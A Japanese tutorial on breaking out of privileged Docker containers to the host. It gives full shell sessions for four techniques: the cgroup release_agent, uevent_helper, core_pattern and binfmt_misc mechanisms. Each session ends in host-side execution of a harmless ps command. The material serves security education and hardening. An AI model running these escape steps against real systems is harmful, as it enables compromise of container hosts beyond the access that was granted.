# ホストへのエスケープ

コンテナからホスト側にエスケープできることを、コンテナという牢獄から脱出することから「Breakout」「Jailbreak」などと呼ばれることがあります。  
ここではコンテナからホスト側への Breakout の手法について紹介します。

## Privileged Container

Privileged (特権)コンテナはホスト上の全てのデバイスへのアクセスを許可するだけでなく、AppArmor などの LSM を適用せず、Capability も過剰に与えてしまうため、適切に Isolation されていないホストのプロセスとほぼ同等のプロセスになります。  
そのため、特権コンテナを侵害された場合はホスト側にエスケープできてしまうので注意が必要です。

Linux の一部機能には任意のプログラムを実行できるヘルパー機能が多数あります。例えば `call_usermode_helper_exec()` のような Linux カーネルからユーザーランドアプリケーションを実行する API などがあります。  
Privileged コンテナのように過剰な Capability を与えると、コンテナの中で特定の操作が可能な場合、この機能を利用してホスト側にエスケープすることができます。  
ここでは、そのような機能を利用してコンテナからホストへエスケープする方法をいくつか紹介します。

## cgroup release_agent

cgourp v1 には cgroup で管理されているプロセスが存在しなくなった場合にカーネルに通知を送る機能があり、その際に release_agent プログラムとしてユーザーランドのプログラムを実行することができます。  
これを利用して例えばコンテナの中で cgroupfs をマウントすることができる場合、次のようにホスト側にエスケープすることができます。

```sh
$ docker run --privileged --rm -it ubuntu:latest bash

root@927bb44baf0d:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# release_agent を有効化する
root@927bb44baf0d:/# echo 1 > /tmp/cgrp/x/notify_on_release

# ホスト側で実行するプログラムを作成
root@927bb44baf0d:/# cat <<EOF > /cmd
> #!/bin/sh
> ps aux > /tmp/output
> EOF
root@927bb44baf0d:/# chmod +x /cmd

# ホスト側からみた実行したいプログラムのファイルパスを release_agent プログラムとして登録
root@927bb44baf0d:/# mount | grep overlay2
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4HN7CVYLX5VML6M3TK4HLNKHX2:/var/lib/docker/overlay2/l/RWN3A47IS5OFAM3BM5YCAOFBYD:/var/lib/docker/overlay2/l/DCI4FWEI5GWG2MAABQGMYNWPTY:/var/lib/docker/overlay2/l/EAP7XMJNE3QFMGS5SOHUTYQPBB,upperdir=/var/lib/docker/overlay2/ed8b2e0d609b87c327e4c6061308d83acca13bc88fe96394b46dd5312af84277/diff,workdir=/var/lib/docker/overlay2/ed8b2e0d609b87c327e4c6061308d83acca13bc88fe96394b46dd5312af84277/work,xino=off)
root@927bb44baf0d:/# echo "/var/lib/docker/overlay2/ed8b2e0d609b87c327e4c6061308d83acca13bc88fe96394b46dd5312af84277/diff/cmd" > /tmp/cgrp/release_agent

root@927bb44baf0d:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# ホスト側でコマンドが実行されたことが確認できる
ubuntu@docker:/tmp$ head /tmp/output
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3 168656 12660 ?        Ss   Nov02   0:04 /sbin/init
root           2  0.0  0.0      0     0 ?        S    Nov02   0:00 [kthreadd]
```

## uevent_helper

uevent はデバイスが追加 / 削除されたときに送信されるイベントです。その際に、 `/sys/kernel/uevent_helper` に記載されているプログラムを実行します。  
これを利用して次のようにホスト側にエスケープできます。

```sh
ubuntu@docker:~$ docker run --privileged --rm -it ubuntu:latest bash
# ホスト側で実行するプログラムを作成
root@76017d104897:/# cat <<EOF > /cmd
> #!/bin/sh
> ps aux > /tmp/output
> EOF
root@76017d104897:/# chmod +x /cmd

# ホスト側からみた実行したいプログラムのファイルパスを書き込む
root@76017d104897:/# mount | grep overlay2
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/US76JCNP5VCQ2CUZIXYAU2VIQQ:/var/lib/docker/overlay2/l/RWN3A47IS5OFAM3BM5YCAOFBYD:/var/lib/docker/overlay2/l/DCI4FWEI5GWG2MAABQGMYNWPTY:/var/lib/docker/overlay2/l/EAP7XMJNE3QFMGS5SOHUTYQPBB,upperdir=/var/lib/docker/overlay2/bb19048f6e555df3c5387b9a5a14c14fdd592fb97c3bd60ea5925ee75036cecd/diff,workdir=/var/lib/docker/overlay2/bb19048f6e555df3c5387b9a5a14c14fdd592fb97c3bd60ea5925ee75036cecd/work,xino=off)
root@76017d104897:/# echo "/var/lib/docker/overlay2/bb19048f6e555df3c5387b9a5a14c14fdd592fb97c3bd60ea5925ee75036cecd/diff/cmd" > /sys/kernel/uevent_helper

# uevent を発生させる
root@76017d104897:/# echo change > /sys/class/mem/null/uevent

# ホスト側でコマンドが実行されたことが確認できる
ubuntu@docker:/tmp$ head /tmp/output
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3 168656 12660 ?        Ss   Nov02   0:04 /sbin/init
root           2  0.0  0.0      0     0 ?        S    Nov02   0:00 [kthreadd]
```

## core_pattern

coredump を生成する場合に `/proc/sys/kernel/core_pattern` で出力ファイル名を変更することができますが、 `|` (パイプ) が利用できるため、コマンドの実行が可能になります。  
これを利用して次のような手順でホスト側にエスケープできます。

```sh
ubuntu@docker:~$ docker run --privileged --rm -it ubuntu:latest bash
# ホスト側で実行するプログラムを作成
root@204c6661f442:/# cat <<EOF > /cmd
> #!/bin/sh
> ps aux > /tmp/output
> EOF
root@204c6661f442:/# chmod +x /cmd

# ホスト側からみた実行したいプログラムのファイルパスを書き込む
root@204c6661f442:/# mount | grep overlay2
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/UEAKPG6M42F22YWZ3I7HK3LESS:/var/lib/docker/overlay2/l/RWN3A47IS5OFAM3BM5YCAOFBYD:/var/lib/docker/overlay2/l/DCI4FWEI5GWG2MAABQGMYNWPTY:/var/lib/docker/overlay2/l/EAP7XMJNE3QFMGS5SOHUTYQPBB,upperdir=/var/lib/docker/overlay2/6acd5e8aa79a341ec8c970a77d9993617a7414b7c0e86fc719d1d54c718cc3d0/diff,workdir=/var/lib/docker/overlay2/6acd5e8aa79a341ec8c970a77d9993617a7414b7c0e86fc719d1d54c718cc3d0/work,xino=off)
root@204c6661f442:/# echo "|/var/lib/docker/overlay2/6acd5e8aa79a341ec8c970a77d9993617a7414b7c
0e86fc719d1d54c718cc3d0/diff/cmd" > /proc/sys/kernel/core_pattern

# プロセスを作り、SEGV させる
root@204c6661f442:/# sleep 100 &
[1] 16
root@204c6661f442:/# kill -SEGV 16
root@204c6661f442:/#
[1]+  Segmentation fault      (core dumped) sleep 100

# ホスト側でコマンドが実行されたことが確認できる
ubuntu@docker:/# head /tmp/output
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3 168940 13144 ?        Ss   Nov13   0:05 /sbin/init
root           2  0.0  0.0      0     0 ?        S    Nov13   0:00 [kthreadd]
```

## binfmt_misc

`/proc/sys/fs/binfmt_misc` は指定したマジックナンバーや拡張子のファイルを実行する際に、指定のプログラム(インタプリタ)を実行することができます。  
これを利用することで次のようにホスト側にエスケープできます。

```sh
ubuntu@docker:~$ docker run --privileged --rm -it ubuntu:latest bash
# binfmt_misc をマウント
root@4af543b9eb3f:/# mount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc

# ホスト側で実行するプログラムを作成
root@4af543b9eb3f:/# cat <<EOF >/cmd
> #!/bin/sh
> ps aux > /tmp/output
> EOF
root@4af543b9eb3f:/# chmod +x /cmd

# .sh という拡張子のプログラムが実行されると cmd が実行するようにする
root@4af543b9eb3f:/# mount | grep overlay2
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/MVSWHTODE2R4PLCNOXNJ7MEHNX:/var/lib/docker/overlay2/l/RWN3A47IS5OFAM3BM5YCAOFBYD:/var/lib/docker/overlay2/l/DCI4FWEI5GWG2MAABQGMYNWPTY:/var/lib/docker/overlay2/l/EAP7XMJNE3QFMGS5SOHUTYQPBB,upperdir=/var/lib/docker/overlay2/f5cbdf158d44a4e44969eab02661e22c0886d7695e216b4590115f35d4e7cc3f/diff,workdir=/var/lib/docker/overlay2/f5cbdf158d44a4e44969eab02661e22c0886d7695e216b4590115f35d4e7cc3f/work,xino=off)
root@4af543b9eb3f:/# echo ':evil:E::sh::/var/lib/docker/overlay2/f5cbdf158d44a4e44969eab02661e22c0886d7695e216b4590115f35d4e7cc3f/diff/cmd:OC' > /proc/sys/fs/binfmt_misc/register

# ホスト側で .sh 拡張子をもつファイルを実行すると cmd が実行される
ubuntu@docker:~$ /tmp/test.sh
ubunty@docker:~# head /tmp/output
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3 168940 13144 ?        Ss   Nov13   0:05 /sbin/init
root           2  0.0  0.0      0     0 ?        S    Nov13   0:00 [kthreadd]
...
```

